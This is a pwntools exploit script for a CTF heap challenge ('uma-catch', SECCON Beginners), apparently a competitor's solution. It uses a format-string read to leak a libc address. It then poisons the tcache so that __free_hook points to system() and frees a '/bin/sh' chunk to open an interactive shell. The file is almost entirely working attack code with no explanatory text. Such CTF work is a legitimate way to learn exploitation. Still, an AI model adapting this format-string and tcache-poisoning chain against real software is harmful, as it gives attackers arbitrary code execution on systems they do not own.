#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "uma-catch.quals.beginners.seccon.jp"
PORT = 4101

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc-2.27.so')
	off_start_main = libc.symbols["__libc_start_main"] + 231
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	off_start_main = libc.symbols["__libc_start_main"] + 243

off_free_hook = libc.symbols["__free_hook"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search(b"/bin/sh"))

def catch(idx):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter("> ", str(idx))
	conn.sendlineafter("> ", "bay")

def name(idx, n):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter("> ", str(idx))
	conn.sendafter("> ", n)

def show(idx):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter("> ", str(idx))

def dance(idx):
	conn.sendlineafter("> ", "4")
	conn.sendlineafter("> ", str(idx))

def delete(idx):
	conn.sendlineafter("> ", "5")
	conn.sendlineafter("> ", str(idx))

def exploit():
	catch(0)
	name(0,"%11$p\n") 	# fsb
	show(0)				# libc address leak
	libc_base = int(conn.recvline(),16) - off_start_main
	libc_free_hook = libc_base + off_free_hook
	libc_system = libc_base + off_system
	
	catch(1)
	delete(0)
	delete(1)
	
	name(1, p64(libc_free_hook)+b"\n")  # link _free_hook to tcache
	catch(2)
	catch(3)							# get a chunk on _free_hook
	name(3, p64(libc_system)+b"\n")		# [_free_hook] = system()
	name(2, "/bin/sh\x00\n")
	
	delete(2)							# free("/bin/sh") => system("/bin/sh")
	#print(hex(first_chk))
	#print(hex(libc_base))
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
